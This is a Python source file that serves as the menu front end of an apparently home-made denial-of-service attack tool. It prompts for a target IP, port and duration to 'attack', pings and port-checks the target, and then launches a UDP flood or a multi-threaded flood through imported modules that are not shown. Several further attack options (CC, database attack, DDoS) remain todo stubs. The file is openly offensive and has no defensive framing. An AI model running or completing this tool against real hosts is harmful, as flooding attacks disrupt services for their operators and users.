import udpflood
import tool
import push

tool.surface()
choose = input("Please input your choose:")  # todo 校验输入
# print(choose)
if choose == "1":
    print("Now you in udpflood method")
    ip = input("Please input the ip you wanna attack：")  # todo 校验ip
    port = input("Please input the port you wanna attack：")
    usertime = input("Please input the time you wanna attack：")
    ipright = tool.check_ip(ip)
    tool.ping(ipright)
    tool.testport(ipright, port)
    udpflood.udpfloods(ipright, port, usertime)  # todo string转
elif choose == "2":
    # todo ddos
    ip = input("Please input the ip you wanna attack：")
    port = input("Please input the port you wanna attack：")
    ipright = tool.check_ip(ip)
    tool.ping(ipright)
    tool.testport(ipright, port)
    push.more_thread(ipright, port)#todo 進度條test
elif choose == "3":
    # todo cc
    input()
elif choose == "4":
    # todo DBattack
    input()
elif choose == "5":
    # todo ddos
    input()
else:
    quit()
